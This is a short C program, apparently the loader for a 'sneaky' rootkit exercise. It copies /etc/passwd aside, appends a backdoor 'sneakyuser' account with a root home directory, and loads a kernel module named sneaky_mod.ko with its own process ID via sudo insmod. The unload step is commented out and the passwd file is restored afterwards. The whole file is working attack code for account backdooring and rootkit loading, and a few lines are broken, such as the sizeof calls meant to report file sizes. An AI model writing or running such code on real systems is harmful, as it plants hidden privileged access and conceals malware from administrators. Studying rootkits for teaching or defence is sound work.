#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>


void pwdswap(void) {
  system("sudo cp /etc/passwd /tmp/passwd");
  FILE * passwd = fopen("/etc/passwd", "at+");
  if (passwd == NULL) {
    perror("File Opening");
    return;
  }
  fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",50,1,passwd);
  fclose(passwd);

}


int main(void) {

  
  //get process ID
  int PID;
  PID = getpid();
  char num[20];
  //cast PID as string
  sprintf(num, "%d", PID);
  char str[100];
  strcpy(str, "sudo insmod sneaky_mod.ko");
  strcat(str, " pid=");
  strcat(str, num);

  //Step 1: Print Process ID
  printf("My process ID is: %d\n", PID);

  //Step 2: Swap passwd files
  pwdswap();
  
  //Step 3: Load kernel module
  system(str);

  system("lsmod");

  
  //Step 5: Release kernel module 
  //  system("sudo rmmod sneaky_mod.ko");


  //Step 6: Restore /etc/passwd file
  system("sudo cp /tmp/passwd /etc/passwd");

  printf("My etc size is:%lu\n", sizeof("/etc/passwd"));
  printf("My tmp size is:%lu\n", sizeof("/tmp/passwd"));
  
  
  return EXIT_SUCCESS;

}
